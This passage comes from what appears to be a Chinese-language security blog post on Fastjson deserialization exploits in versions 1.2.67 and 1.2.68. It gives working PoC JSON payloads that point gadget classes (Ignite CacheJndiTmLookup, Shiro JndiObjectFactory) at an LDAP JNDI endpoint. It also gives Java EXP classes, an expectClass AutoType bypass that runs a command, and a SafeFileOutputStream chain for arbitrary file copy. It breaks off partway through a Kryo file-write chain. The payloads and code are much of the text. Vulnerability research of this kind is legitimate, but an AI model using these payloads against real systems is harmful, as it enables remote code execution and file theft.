&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;  </span><br><span class="hljs-comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,&quot; +  </span><br><span class="hljs-comment">//                &quot;\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&#125;&quot;;  </span><br> JSON.parse(poc);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/fastjson/f53.png" srcset="/img/loading.gif" lazyload></p>
+<p>总之就是寻找有漏洞但是还未列入黑名单的入口类</p>
+<h1 id="1-2-67反序列化漏洞-黑名单绕过"><a href="#1-2-67反序列化漏洞-黑名单绕过" class="headerlink" title="1.2.67反序列化漏洞(黑名单绕过)"></a>1.2.67反序列化漏洞(黑名单绕过)</h1><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ul>
+<li>开启AutoType；</li>
+<li>Fastjson &lt;&#x3D; 1.2.67；</li>
+<li>JNDI注入利用所受的JDK版本限制；</li>
+<li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</li>
+<li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；</li>
+</ul>
+<h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>新Gadget绕过黑名单限制。</p>
+<p>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;jndiNames&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tm&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.tm&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>org.apache.shiro.jndi.JndiObjectFactory类PoC：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;resourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;instance&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.instance&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>EXP</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;  <br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  <br><span class="hljs-keyword">import</span> com.sun.xml.internal.ws.api.ha.StickyFeature;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SuccessBypassEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;,&quot;</span> +  <br>                <span class="hljs-string">&quot; \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/ExportObject\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;</span>;  <br> JSON.parse(poc);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="1-2-68反序列化漏洞-expectClass绕过AutoType）"><a href="#1-2-68反序列化漏洞-expectClass绕过AutoType）" class="headerlink" title="1.2.68反序列化漏洞(expectClass绕过AutoType）"></a>1.2.68反序列化漏洞(expectClass绕过AutoType）</h1><h2 id="前提条件-2"><a href="#前提条件-2" class="headerlink" title="前提条件"></a>前提条件</h2><ul>
+<li>Fastjson &lt;&#x3D; 1.2.68；</li>
+<li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中；</li>
+</ul>
+<h2 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>本次绕过<code>checkAutoType()</code>函数的关键点在于其第二个参数expectClass，可以通过构造恶意JSON数据、传入某个类作为expectClass参数再传入另一个expectClass类的子类或实现类来实现绕过<code>checkAutoType()</code>函数执行恶意操作。</p>
+<p>简单地说，本次绕过<code>checkAutoType()</code>函数的攻击步骤为：</p>
+<ol>
+<li>先传入某个类，其加载成功后将作为expectClass参数传入<code>checkAutoType()</code>函数；</li>
+<li>查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或<code>setter</code>方法中存在危险操作则可以被攻击利用；</li>
+</ol>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>简单地验证利用expectClass绕过的可行性，先假设Fastjson服务端存在如下实现AutoCloseable接口类的恶意类VulAutoCloseable：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulAutoCloseable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AutoCloseable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">VulAutoCloseable</span><span class="hljs-params">(String cmd)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br> <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>构造PoC如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.example.VulAutoCloseable&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;calc&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>无需开启AutoType，直接成功绕过<code>CheckAutoType()</code>的检测从而触发执行：</p>
+<p>顺利弹出计算器</p>
+<p><img src="/img/fastjson/f54.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h2><p>依旧把断点下载checkAutoType处，开始调试</p>
+<p>第一次是传入 <code>AutoCloseable</code> 类进行校验，这里<code>CheckAutoType()</code>函数的 <code>expectClass</code> 参数是为 null 的：</p>
+<p><img src="/img/fastjson/f55.png" srcset="/img/loading.gif" lazyload></p>
+<p>往下，直接从缓存 Mapping 中获取到了 <code>AutoCloseable</code> 类：然后获取到这个 <code>clazz</code> 之后进行了一系列的判断，<code>clazz</code> 是否为 null，以及关于 internalWhite 的判断，internalWhite 就是内部加白的名单，很显然我们这里肯定不是，内部加白的名单一定是非常安全的。</p>
+<p><img src="/img/fastjson/f56.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后后面这个判断里面出现了 <code>expectClass</code>，先判断 <code>clazz</code> 是否不是 <code>expectClass</code> 类的继承类且不是 <code>HashMap</code> 类型，是的话抛出异常，否则直接返回该类。</p>
+<p>我们这里没有 <code>expectClass</code>，所以会直接返回 <code>AutoCloseable</code> 类：</p>
+<p><img src="/img/fastjson/f57.png" srcset="/img/loading.gif" lazyload></p>
+<p>接着，返回到 <code>DefaultJSONParser</code> 类中获取到 <code>clazz</code> 后再继续执行，根据 <code>AutoCloseable</code> 类获取到反序列化器为 <code>JavaBeanDeserializer</code>，然后应用该反序列化器进行反序列化操作：</p>
+<p><img src="/img/fastjson/f58.png" srcset="/img/loading.gif" lazyload></p>
+<p>往里走，调用的是 <code>JavaBeanDeserializer</code> 的 <code>deserialze()</code> 方法进行反序列化操作，其中 type 参数就是传入的 <code>AutoCloseable类</code>，如图：</p>
+<p><img src="/img/fastjson/f59.png" srcset="/img/loading.gif" lazyload></p>
+<p>往下的逻辑，就是解析获取 PoC 后面的类的过程。这里看到获取不到对象反序列化器之后，就会进去如图的判断逻辑中，设置 type 参数即 <code>java.lang.AutoCloseable</code> 类为 <code>checkAutoType()</code> 方法的 expectClass 参数来调用 <code>checkAutoType()</code> 函数来获取指定类型，然后在获取指定的反序列化器：</p>
+<p><img src="/img/fastjson/f60.png" srcset="/img/loading.gif" lazyload></p>
+<p>此时，第二次进入 <code>checkAutoType()</code> 函数，typeName 参数是 PoC 中第二个指定的类，expectClass 参数则是 PoC 中第一个指定的类：</p>
+<p><img src="/img/fastjson/f61.png" srcset="/img/loading.gif" lazyload></p>
+<p>往下，由于java.lang.AutoCloseable类并非其中黑名单中的类，因此expectClassFlag被设置为true：</p>
+<p><img src="/img/fastjson/f62.png" srcset="/img/loading.gif" lazyload></p>
+<p>最后走到我们刚刚说的地方，当这个类不在白名单，且autoType开启或者expectClassFlag为true时，即可进入AutoType开启时的检测逻辑</p>
+<p><img src="/img/fastjson/f63.png" srcset="/img/loading.gif" lazyload></p>
+<p>遍历类名后会进入loadClass类，类加载后不会进入缓存</p>
+<p><img src="/img/fastjson/f64.png" srcset="/img/loading.gif" lazyload></p>
+<p>往下，判断是否jsonType、true的话直接添加Mapping缓存并返回类，否则接着判断返回的类是否是ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常，这也是过滤大多数JNDI注入Gadget的机制：</p>
+<p><img src="/img/fastjson/f66.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们利用的关键点在这里</p>
+<p><img src="/img/fastjson/f65.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (expectClass != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// 如果期望的类不为空</span><br>    <span class="hljs-keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;  <span class="hljs-comment">// 如果期望的类可以从当前类 clazz 继承或实现</span><br>        TypeUtils.addMapping(typeName, clazz);  <span class="hljs-comment">// 将类型名称和类映射</span><br>        <span class="hljs-keyword">return</span> clazz;  <span class="hljs-comment">// 返回类 clazz</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>走入这个条件，我们就顺利将恶意类加入到缓存，之后会getFromMapping直接获取这个类</p>
+<p>就这样执行了恶意代码</p>
+<blockquote>
+<p>简单总结一下：我们在 PoC 里面定义了两个 <code>@type</code></p>
+</blockquote>
+<p>第一个 <code>@type</code> 进去什么都没有发生；但是第一个 <code>@type</code> 是作为第二个指定的类里面的 expectClass。所以说白了，loadClass 去作用的类是第一个 <code>@type</code>；如果这个 <code>@type</code> 是可控的恶意类，可以造成命令执行攻击。</p>
+<p>并且需要加载的目标类是expectClass类的子类或者实现类时（不在黑名单中）</p>
+<h2 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h2><p>前面漏洞复现只是简单地验证绕过方法的可行性，在实际的攻击利用中，是需要我们去寻找实际可行的利用类的。</p>
+<p>主要是寻找关于输入输出流的类来写文件，IntputStream和OutputStream都是实现自AutoCloseable接口的。</p>
+<blockquote>
+<p>寻找 gadget 时的条件是这样的。</p>
+<ul>
+<li>需要一个通过 set 方法或构造方法指定文件路径的 OutputStream</li>
+<li>需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，参数类型必须是byte[]、ByteBuffer、String、char[]其中的一个，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream</li>
+<li>需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法 调用传入的 OutputStream 的 close、write 或 flush 方法</li>
+</ul>
+<p>以上三个组合在一起就能构造成一个写文件的利用链，通过扫描了一下 JDK ，找到符合第一个和第三个条件的类。</p>
+<p>分别是 FileOutputStream 和 ObjectOutputStream，但这两个类选取的构造器，不符合情况，所以只能找到这两个类的子类，或者功能相同的类。</p>
+</blockquote>
+<h3 id="复制文件（任意文件读取漏洞）"><a href="#复制文件（任意文件读取漏洞）" class="headerlink" title="复制文件（任意文件读取漏洞）"></a>复制文件（任意文件读取漏洞）</h3><p>利用类：<strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong></p>
+<p>依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>看下SafeFileOutputStream类的源码，其<code>SafeFileOutputStream(java.lang.String, java.lang.String)</code>构造函数判断了如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中，正是利用其构造函数的这个特点来实现Web场景下的任意文件读取：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeFileOutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OutputStream</span> &#123;<br>    <span class="hljs-keyword">protected</span> File temp;<br>    <span class="hljs-keyword">protected</span> File target;<br>    <span class="hljs-keyword">protected</span> OutputStream output;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> failed;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXTENSION</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.bak&quot;</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SafeFileOutputStream</span><span class="hljs-params">(File file)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">this</span>(file.getAbsolutePath(), (String)<span class="hljs-literal">null</span>);<br>    &#125;<br> <br>    <span class="hljs-comment">// 该构造函数判断如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SafeFileOutputStream</span><span class="hljs-params">(String targetPath, String tempPath)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">this</span>.failed = <span class="hljs-literal">false</span>;<br>        <span class="hljs-built_in">this</span>.target = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(targetPath);<br>        <span class="hljs-built_in">this</span>.createTempFile(tempPath);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.target.exists()) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.temp.exists()) &#123;<br>                <span class="hljs-built_in">this</span>.output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-built_in">this</span>.target));<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br> <br>            <span class="hljs-built_in">this</span>.copy(<span class="hljs-built_in">this</span>.temp, <span class="hljs-built_in">this</span>.target);<br>        &#125;<br> <br>        <span class="hljs-built_in">this</span>.output = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-built_in">this</span>.temp));<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.output.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var2) &#123;<br>            <span class="hljs-built_in">this</span>.failed = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">throw</span> var2;<br>        &#125;<br> <br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.failed) &#123;<br>            <span class="hljs-built_in">this</span>.temp.delete();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.commit();<br>        &#125;<br> <br>    &#125;<br> <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">commit</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.temp.exists()) &#123;<br>            <span class="hljs-built_in">this</span>.target.delete();<br>            <span class="hljs-built_in">this</span>.copy(<span class="hljs-built_in">this</span>.temp, <span class="hljs-built_in">this</span>.target);<br>            <span class="hljs-built_in">this</span>.temp.delete();<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">copy</span><span class="hljs-params">(File sourceFile, File destinationFile)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (sourceFile.exists()) &#123;<br>            <span class="hljs-keyword">if</span> (!sourceFile.renameTo(destinationFile)) &#123;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">source</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">destination</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br> <br>                <span class="hljs-keyword">try</span> &#123;<br>                    source = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(sourceFile));<br>                    destination = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(destinationFile));<br>                    <span class="hljs-built_in">this</span>.transferStreams(source, destination);<br>                    destination.close();<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    FileUtil.safeClose(source);<br>                    FileUtil.safeClose(destination);<br>                &#125;<br> <br>            &#125;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createTempFile</span><span class="hljs-params">(String tempPath)</span> &#123;<br>        <span class="hljs-keyword">if</span> (tempPath == <span class="hljs-literal">null</span>) &#123;<br>            tempPath = <span class="hljs-built_in">this</span>.target.getAbsolutePath() + <span class="hljs-string">&quot;.bak&quot;</span>;<br>        &#125;<br> <br>        <span class="hljs-built_in">this</span>.temp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(tempPath);<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">flush</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.output.flush();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var2) &#123;<br>            <span class="hljs-built_in">this</span>.failed = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">throw</span> var2;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getTempFilePath</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.temp.getAbsolutePath();<br>    &#125;<br> <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transferStreams</span><span class="hljs-params">(InputStream source, OutputStream destination)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">8192</span>];<br> <br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">bytesRead</span> <span class="hljs-operator">=</span> source.read(buffer);<br>            <span class="hljs-keyword">if</span> (bytesRead == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br> <br>            destination.write(buffer, <span class="hljs-number">0</span>, bytesRead);<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">int</span> b)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.output.write(b);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var3) &#123;<br>            <span class="hljs-built_in">this</span>.failed = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">throw</span> var3;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>EXP</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sf.maven.fastjsondemo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SuccessBypassEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream\&quot;,\&quot;tempPath\&quot;:\&quot;D://Test.class\&quot;,\&quot;targetPath\&quot;:\&quot;D://1.txt\&quot;&#125;&quot;</span>;<br>        JSON.parseObject(s);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p>写内容类：<strong>com.esotericsoftware.kryo.io.Output</strong></p>
+<p>依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.esotericsoftware<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kryo<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>Output类主要用来写内容，它提供了<code>setBuffer()</code>和<code>setOutputStream()</code>两个setter方法可以用来写入输入流，其中buffer参数值是文件内容，outputStream参数值就是前面的SafeFileOutputStream类对象，而要触发写文件操作则需要调用其<code>flush()</code>函数：</p>
